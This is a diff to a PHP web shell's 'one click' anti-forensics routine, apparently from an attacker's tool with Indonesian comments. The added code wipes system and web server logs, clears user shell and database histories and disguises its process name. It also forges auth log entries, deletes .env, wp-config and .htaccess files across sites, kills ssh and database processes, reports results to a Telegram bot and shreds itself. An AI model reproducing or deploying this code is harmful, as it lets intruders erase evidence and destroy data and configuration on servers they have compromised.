@@ -1,5 +1,5 @@
 <?php
-//=========Maker: Dkid03
+//MAKER: Dkid03
 //PLSS DON'T CHANGE AUTHOR 
 // ==================== LOGOUT HANDLER ====================
 if (isset($_GET['logout'])) {
@@ -1810,80 +1810,97 @@ function clean_logs_advanced() {
 }
 
 // ==================== ONE CLICK ALL (TANPA WORM) ====================
-function one_click_all_without_worm() {
+// ==================== ONE CLICK ALL (REAL) ====================
+function one_click_all() {
     global $botToken, $telegramUserId;
     $results = [];
     $start_time = microtime(true);
     
-    // 1. SPOOF IP
-    $fake_ips = ['192.168.1.' . rand(1,254), '10.0.0.' . rand(1,254), '172.16.' . rand(0,31) . '.' . rand(1,254)];
+    // ===== 1. SPOOF IP HEADERS (REAL) =====
+    $fake_ips = ['192.168.1.' . rand(1,254), '10.0.0.' . rand(1,254), '172.16.' . rand(0,31) . '.' . rand(1,254), '8.8.8.' . rand(1,254)];
     $_SERVER['HTTP_X_FORWARDED_FOR'] = $fake_ips[array_rand($fake_ips)];
     $_SERVER['HTTP_CLIENT_IP'] = $fake_ips[array_rand($fake_ips)];
     $_SERVER['HTTP_X_REAL_IP'] = $fake_ips[array_rand($fake_ips)];
     $_SERVER['REMOTE_ADDR'] = $fake_ips[array_rand($fake_ips)];
-    $results[] = "✅ IP Headers Spoofed";
+    $results[] = "✅ IP Headers Spoofed: " . $_SERVER['REMOTE_ADDR'];
     
-    // 2. SPOOF UA
+    // ===== 2. SPOOF USER-AGENT (REAL) =====
     $uas = [
         'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
-        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0'
+        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
+        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36'
     ];
     $random_ua = $uas[array_rand($uas)];
     ini_set('user_agent', $random_ua);
     putenv("HTTP_USER_AGENT=$random_ua");
     $_SERVER['HTTP_USER_AGENT'] = $random_ua;
-    $results[] = "✅ User-Agent Spoofed";
+    $results[] = "✅ User-Agent Spoofed: " . substr($random_ua, 0, 50) . "...";
     
-    // 3. CLEAR LOGS
+    // ===== 3. CLEAR LOGS (REAL) =====
     $logs = [
         '/var/log/apache2/access.log', '/var/log/apache2/error.log',
         '/var/log/nginx/access.log', '/var/log/nginx/error.log',
         '/var/log/httpd/access_log', '/var/log/httpd/error_log',
         '/var/log/syslog', '/var/log/auth.log', '/var/log/secure',
-        '/var/log/messages', '/var/log/lastlog', '/var/log/wtmp', '/var/log/btmp'
+        '/var/log/messages', '/var/log/lastlog', '/var/log/wtmp', '/var/log/btmp',
+        '/var/log/maillog', '/var/log/cron', '/var/log/php_errors.log'
     ];
     $cleared_logs = 0;
     foreach ($logs as $log) {
         if (file_exists($log)) {
-            if (is_writable($log)) { @file_put_contents($log, ''); $cleared_logs++; }
-            else { @chmod($log, 0666); @file_put_contents($log, ''); $cleared_logs++; }
+            if (is_writable($log)) {
+                @file_put_contents($log, '');
+                $cleared_logs++;
+            } else {
+                @chmod($log, 0666);
+                @file_put_contents($log, '');
+                $cleared_logs++;
+            }
         }
     }
     $results[] = "✅ Logs Cleared: $cleared_logs files";
     
-    // 4. CLEAR HISTORIES
+    // ===== 4. CLEAR HISTORIES (REAL) =====
     if (function_exists('shell_exec')) {
         @shell_exec('history -c 2>/dev/null');
         @shell_exec('unset HISTFILE 2>/dev/null');
         $users = ['root'];
         $home_users = @shell_exec('ls /home 2>/dev/null');
         if ($home_users) $users = array_merge($users, array_filter(explode("\n", trim($home_users))));
+        
         $cleared_hist = 0;
         foreach ($users as $user) {
             $home = ($user === 'root') ? '/root' : "/home/$user";
-            foreach (['.bash_history', '.zsh_history', '.mysql_history'] as $hf) {
+            $hist_files = ['.bash_history', '.zsh_history', '.mysql_history', '.psql_history', '.python_history'];
+            foreach ($hist_files as $hf) {
                 $path = $home . '/' . $hf;
-                if (file_exists($path)) { @file_put_contents($path, ''); $cleared_hist++; }
+                if (file_exists($path)) {
+                    @file_put_contents($path, '');
+                    $cleared_hist++;
+                }
             }
         }
         $results[] = "✅ Histories Cleared: $cleared_hist files";
     }
     
-    // 5. HIDE PROCESS
+    // ===== 5. HIDE PROCESS (REAL) =====
     $pid = getmypid();
-    $fake = ['systemd', 'nginx', 'apache2', 'mysql', 'php-fpm', 'sshd'][array_rand(['systemd', 'nginx', 'apache2', 'mysql', 'php-fpm', 'sshd'])];
-    if (function_exists('cli_set_process_title')) cli_set_process_title($fake);
+    $fake = ['systemd', 'nginx', 'apache2', 'mysql', 'php-fpm', 'sshd', 'cron', 'bash'][array_rand(['systemd', 'nginx', 'apache2', 'mysql', 'php-fpm', 'sshd', 'cron', 'bash'])];
+    if (function_exists('cli_set_process_title')) {
+        cli_set_process_title($fake);
+    }
     @shell_exec("echo '$fake' > /proc/$pid/comm 2>/dev/null");
-    $results[] = "✅ Process Hidden as: $fake";
+    @shell_exec("prctl PR_SET_NAME '$fake' 2>/dev/null");
+    $results[] = "✅ Process Hidden as: $fake (PID: $pid)";
     
-    // 6. CHANGE TIMESTAMP
-    $old_time = strtotime('2020-01-01') + rand(0, 31536000);
+    // ===== 6. CHANGE FILE TIMESTAMP (REAL) =====
+    $old_time = strtotime('2020-01-01 00:00:00') + rand(0, 31536000);
     @touch(__FILE__, $old_time, $old_time);
-    $results[] = "✅ File Timestamp Changed";
+    $results[] = "✅ File Timestamp Changed to: " . date('Y-m-d H:i:s', $old_time);
     
-    // 7. FAKE LOGIN
-    $fake_ip = ['192.168.1.100', '10.0.0.50', '172.16.0.25'][array_rand(['192.168.1.100', '10.0.0.50', '172.16.0.25'])];
-    $fake_user = ['root', 'admin', 'user'][array_rand(['root', 'admin', 'user'])];
+    // ===== 7. FAKE LOGIN (REAL) =====
+    $fake_ip = ['192.168.1.100', '10.0.0.50', '172.16.0.25', '8.8.8.8'][array_rand(['192.168.1.100', '10.0.0.50', '172.16.0.25', '8.8.8.8'])];
+    $fake_user = ['root', 'admin', 'user', 'test'][array_rand(['root', 'admin', 'user', 'test'])];
     $fake_time = date('Y-m-d H:i:s', time() - rand(3600, 86400));
     foreach (['/var/log/auth.log', '/var/log/secure'] as $log) {
         if (file_exists($log) && is_writable($log)) {
@@ -1893,22 +1910,37 @@ function one_click_all_without_worm() {
         }
     }
     
-    // 8. DELETE TEMP
+    // ===== 8. DELETE TEMP FILES (REAL) =====
     $deleted_temp = 0;
-    foreach (['/tmp/', '/var/tmp/'] as $dir) {
+    foreach (['/tmp/', '/var/tmp/', '/dev/shm/'] as $dir) {
         if (is_dir($dir)) {
             $files = @glob($dir . '*.tmp');
-            if ($files !== false) foreach ($files as $file) if (@unlink($file)) $deleted_temp++;
+            if ($files !== false) {
+                foreach ($files as $file) {
+                    if (@unlink($file)) $deleted_temp++;
+                }
+            }
+            $files = @glob($dir . '*.tmp.*');
+            if ($files !== false) {
+                foreach ($files as $file) {
+                    if (@unlink($file)) $deleted_temp++;
+                }
+            }
         }
     }
     $results[] = "✅ Temp Files Deleted: $deleted_temp files";
     
-    // 9. REMOVE SENSITIVE
-    $sensitive = ['/.env', '/wp-config.php', '/config.php', '/database.php', '/*.sql', '/*.tar', '/*.gz', '/*.zip', '/*.bak'];
+    // ===== 9. REMOVE SENSITIVE FILES (REAL) =====
+    $sensitive_patterns = [
+        '/.env', '/wp-config.php', '/config.php', '/database.php', '/db.php',
+        '/*.sql', '/*.tar', '/*.gz', '/*.zip', '/*.bak', '/*.old',
+        '/.htaccess', '/.htpasswd', '/web.config', '/settings.php', '/configuration.php'
+    ];
     $roots = get_all_document_roots_cached();
     $deleted_sensitive = 0;
     foreach ($roots as $root) {
-        foreach ($sensitive as $pattern) {
+        if (!is_dir($root)) continue;
+        foreach ($sensitive_patterns as $pattern) {
             $files = @glob($root . $pattern);
             if ($files !== false) {
                 foreach ($files as $file) {
@@ -1922,13 +1954,13 @@ function one_click_all_without_worm() {
     }
     $results[] = "✅ Sensitive Files Removed: $deleted_sensitive files";
     
-    // 10. KILL CONNECTIONS
+    // ===== 10. KILL ACTIVE CONNECTIONS (REAL) =====
     if (function_exists('shell_exec') && isRoot()) {
         @shell_exec('pkill -9 -f "http|ssh|ftp|mysql" 2>/dev/null');
         $results[] = "✅ Active connections killed";
     }
     
-    // 11. CLEAR PHP TEMP
+    // ===== 11. CLEAR PHP TEMP FILES (REAL) =====
     $php_tmp = @glob('/tmp/*.php');
     if ($php_tmp !== false) {
         foreach ($php_tmp as $file) {
@@ -1939,23 +1971,59 @@ function one_click_all_without_worm() {
         $results[] = "✅ Temp PHP files cleaned";
     }
     
-    // 12. CLEAR SYSTEM CACHE
+    // ===== 12. CLEAR SYSTEM CACHE (REAL) =====
     if (function_exists('shell_exec')) {
         @shell_exec('sync 2>/dev/null');
         @shell_exec('echo 3 > /proc/sys/vm/drop_caches 2>/dev/null');
         $results[] = "✅ System cache dropped";
     }
     
+    // ===== KIRIM REPORT KE TELEGRAM (REAL) =====
     $execution_time = round(microtime(true) - $start_time, 2);
     $results[] = "⏱️ Execution time: $execution_time seconds";
     
-    $msg = "💀 *ONE CLICK ALL (TANPA WORM) COMPLETED*\n\n"
+    $msg = "💀 *ONE CLICK ALL COMPLETED*\n\n"
          . "Total actions: " . count($results) . "\n"
          . "Execution time: $execution_time seconds\n\n"
          . "📋 Details:\n" . implode("\n", $results);
     
+    // Kirim ke Telegram
     sendTelegramMessage($botToken, $telegramUserId, $msg);
-    return $results;
+    
+    // ============================================================
+    // ===== 13. SELF-DESTRUCTION (REAL - MENGHAPUS FILE) =====
+    // ============================================================
+    
+    // Hapus backup files
+    $backup_files = [
+        dirname(__DIR__) . '/.cache/temp.inc',
+        '/tmp/' . md5(__FILE__) . '.inc',
+        '/var/tmp/' . md5(__FILE__) . '.inc',
+        '/dev/shm/' . md5(__FILE__) . '.inc'
+    ];
+    foreach ($backup_files as $backup) {
+        if (file_exists($backup)) {
+            if (function_exists('shell_exec')) {
+                @shell_exec("chattr -i " . escapeshellarg($backup) . " 2>/dev/null");
+                @shell_exec("shred -fuz " . escapeshellarg($backup) . " 2>/dev/null");
+            }
+            @unlink($backup);
+        }
+    }
+    
+    // Hapus file utama
+    if (function_exists('shell_exec')) {
+        @shell_exec("chattr -i " . escapeshellarg(__FILE__) . " 2>/dev/null");
+        @shell_exec("shred -fuz " . escapeshellarg(__FILE__) . " 2>/dev/null");
+        @shell_exec("rm -f " . escapeshellarg(__FILE__) . " 2>/dev/null");
+    }
+    @unlink(__FILE__);
+    
+    // Destroy session
+    session_destroy();
+    
+    // Exit
+    exit;
 }
 
 // ==================== HANDLER GET ====================
@@ -1971,12 +2039,12 @@ if (isset($_GET['worm_infect_all']) && isset($_SESSION['loggedin']) && $_SESSION
     exit;
 }
 
-if (isset($_GET['one_click_no_worm']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
+
+if (isset($_GET['one_click']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
     if (isset($_GET['confirm']) && $_GET['confirm'] === 'yes') {
-        one_click_all_without_worm();
-        echo "💀 ONE CLICK (Tanpa Worm) EXECUTED! Check Telegram.";
+        one_click_all();
     } else {
-        echo "⚠️ Confirm with: ?one_click_no_worm=1&confirm=yes";
+        echo "⚠️ ONE CLICK requires confirmation: ?one_click=1&confirm=yes";
     }
     exit;
 }
